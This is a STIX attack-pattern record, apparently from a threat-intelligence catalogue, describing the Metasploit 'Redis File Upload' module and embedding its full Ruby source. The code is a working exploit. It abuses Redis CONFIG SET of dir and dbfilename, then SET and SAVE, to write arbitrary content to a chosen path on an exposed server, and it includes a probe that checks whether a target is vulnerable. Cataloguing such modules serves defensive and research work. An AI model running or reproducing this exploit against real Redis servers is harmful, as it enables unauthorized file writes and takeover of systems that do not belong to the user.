{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--49248036-2103-4e9c-a048-a7d71988b279",
    "created": "2024-08-14T16:27:09.308529Z",
    "modified": "2024-08-14T16:27:09.308532Z",
    "name": "Redis File Upload",
    "description": "( This module can be used to leverage functionality exposed by Redis to achieve somewhat arbitrary file upload to a file and directory to which the user account running the redis instance has access.  It is not totally arbitrary because the exact contents of the file cannot be completely controlled given the nature of how Redis stores its database on disk. ) 'License'       => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/redis/file_upload.rb",
            "external_id": "file_upload.rb"
        },
        {
            "source_name": "reference",
            "url": "http://antirez.com/news/96"
        },
        {
            "source_name": "reference",
            "url": "http://blog.knownsec.com/2015/11/analysis-of-redis-unauthorized-of-expolit/"
        },
        {
            "source_name": "reference",
            "url": "https://redis.io/topics/protocol"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Redis\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name'          => 'Redis File Upload',\n        'Description'   => %q(\n          This module can be used to leverage functionality exposed by Redis to\n          achieve somewhat arbitrary file upload to a file and directory to\n          which the user account running the redis instance has access.  It is\n          not totally arbitrary because the exact contents of the file cannot\n          be completely controlled given the nature of how Redis stores its\n          database on disk.\n        ),\n        'License'       => MSF_LICENSE,\n        'Author'        => [\n          'Nixawk', # original metasploit module\n          'Jon Hart <jon_hart[at]rapid7.com>' # improved metasploit module\n        ],\n        'References'    => [\n          ['URL', 'http://antirez.com/news/96'],\n          ['URL', 'http://blog.knownsec.com/2015/11/analysis-of-redis-unauthorized-of-expolit/'],\n          ['URL', 'https://redis.io/topics/protocol']\n        ],\n        'Privileged'    => true,\n        'DisclosureDate' => '2015-11-11'\n      )\n    )\n\n    register_options(\n      [\n        OptPath.new('LocalFile', [false, 'Local file to be uploaded']),\n        OptString.new('RemoteFile', [false, 'Remote file path']),\n        OptBool.new('DISABLE_RDBCOMPRESSION', [true, 'Disable compression when saving if found to be enabled', true]),\n        OptBool.new('FLUSHALL', [true, 'Run flushall to remove all redis data before saving', false])\n      ]\n    )\n  end\n\n  def send_file(path, content)\n    # XXX: refactor this to handle redis errors or exceptions in a cleaner manner\n\n    dirname = File.dirname(path)\n    basename = File.basename(path)\n\n    # Get the currently configured dir and dbfilename before we overwrite them;\n    # we should set them back to their original values after we are done.\n    # XXX: this is a hack -- we should really parse the responses more correctly\n    original_dir = (redis_command('CONFIG', 'GET', 'dir') || '').split(/\\r\\n/).last\n    original_dbfilename = (redis_command('CONFIG', 'GET', 'dbfilename') || '').split(/\\r\\n/).last\n    if datastore['DISABLE_RDBCOMPRESSION']\n      original_rdbcompression = (redis_command('CONFIG', 'GET', 'rdbcompression') || '').split(/\\r\\n/).last\n    end\n\n    # set the directory which stores the current redis local store\n    data = redis_command('CONFIG', 'SET', 'dir', dirname) || ''\n    return unless data.include?('+OK')\n\n    # set the file name, relative to the above directory name, that is the redis local store\n    data = redis_command('CONFIG', 'SET', 'dbfilename', basename) || ''\n    return unless data.include?('+OK')\n\n    # Compression string objects using LZF when dump .rdb databases ?\n    # For default that's set to 'yes' as it's almost always a win.\n    # If you want to save some CPU in the saving child set it to 'no' but\n    # the dataset will likely be bigger if you have compressible values or\n    # keys.\n    if datastore['DISABLE_RDBCOMPRESSION'] && original_rdbcompression.upcase == 'YES'\n      data = redis_command('CONFIG', 'SET', 'rdbcompression', 'no') || ''\n      if data.include?('+OK')\n        reset_rdbcompression = true\n      else\n        print_error(\"#{peer} -- Unable to disable rdbcompresssion\")\n        reset_rdbcompression = false\n      end\n    end\n\n    if datastore['FLUSHALL']\n      data = redis_command('FLUSHALL') || ''\n      unless data.include?('+OK')\n        print_warning(\"#{peer} -- failed to flushall(); continuing\")\n      end\n    end\n\n    # set a key in this db that contains our content\n    # XXX: this does not work well (at all) if the content we are uploading is\n    # multiline.  It also probably doesn't work well if the content isn't\n    # simple ASCII text\n    key = Rex::Text.rand_text_alpha(32)\n    data = redis_command('SET', key, content) || ''\n    return unless data.include?('+OK')\n    data = redis_command('SAVE') || ''\n\n    if data.include?('+OK')\n      print_good(\"#{peer} -- saved #{content.size} bytes inside of redis DB at #{path}\")\n    else\n      print_error(\"#{peer} -- failed to save #{content.size} bytes to #{path} (permissions?)\")\n      return\n    end\n\n    # cleanup\n    # XXX: ensure that these get sent if we prematurely return if a previous command fails\n    redis_command('CONFIG', 'SET', 'dir', original_dir)\n    redis_command('CONFIG', 'SET', 'dbfilename', original_dbfilename)\n    if datastore['DISABLE_RDBCOMPRESSION'] && reset_rdbcompression\n      redis_command('CONFIG', 'SET', 'rdbcompression', original_rdbcompression)\n    end\n    redis_command('DEL', key)\n    redis_command('SAVE')\n  end\n\n  def check\n    connect\n    # they are only vulnerable if we can run the CONFIG command, so try that\n    return Exploit::CheckCode::Safe unless (config_data = redis_command('CONFIG', 'GET', '*')) && config_data =~ /dbfilename/\n\n    if (info_data = redis_command('INFO')) && /redis_version:(?<redis_version>\\S+)/ =~ info_data\n      report_redis(redis_version)\n    end\n\n    Exploit::CheckCode::Vulnerable\n  ensure\n    disconnect\n  end\n\n  def setup\n    # this is the content we will upload if not running 'check'.  We are\n    # setting a key/value pair in the database to something such that when the\n    # redis db is saved, the contents of what we are uploading will appear\n    # intact in the middle of the db itself.  The hope is that something\n    # interpretting this file will ignore or be OK-enough with the rest of the\n    # file such that what we uploaded will be interpretted as if it contained\n    # only the contents of what we uploaded.  For example, here is a nearly\n    # empty redis database that started with a single key (foo) value (bar)\n    # pair, and the contents of what we uploaded was the current date:\n    #\n    # 00000000  52 45 44 49 53 30 30 30  31 fe 00 00 03 66 6f 6f  |REDIS0001....foo|\n    # 00000010  03 62 61 72 00 20 6a 6b  59 47 44 74 56 6a 68 53  |.bar. jkYGDtVjhS|\n    # 00000020  6e 57 4f 78 76 58 72 73  6a 71 58 4f 43 52 43 6c  |nWOxvXrsjqXOCRCl|\n    # 00000030  66 4b 6a 54 73 47 1e 0a  54 68 75 20 44 65 63 20  |fKjTsG..Thu Dec |\n    # 00000040  31 30 20 30 39 3a 30 35  3a 32 39 20 50 53 54 20  |10 09:05:29 PST |\n    # 00000050  32 30 31 35 0a ff\n    #\n    # as you can see, the current date exists on its own on a separate line\n    @upload_content = \"\\n#{File.read(datastore['LocalFile']).strip}\\n\" if datastore['LocalFile']\n  end\n\n  def run_host(_ip)\n    fail_with(Failure::BadConfig, \"LocalFile must be set\") unless datastore['LocalFile']\n    fail_with(Failure::BadConfig, \"RemoteFile must be set\") unless datastore['RemoteFile']\n    return unless check == Exploit::CheckCode::Vulnerable\n\n    begin\n      connect\n      send_file(datastore['RemoteFile'], @upload_content)\n    ensure\n      disconnect\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-11-11"
}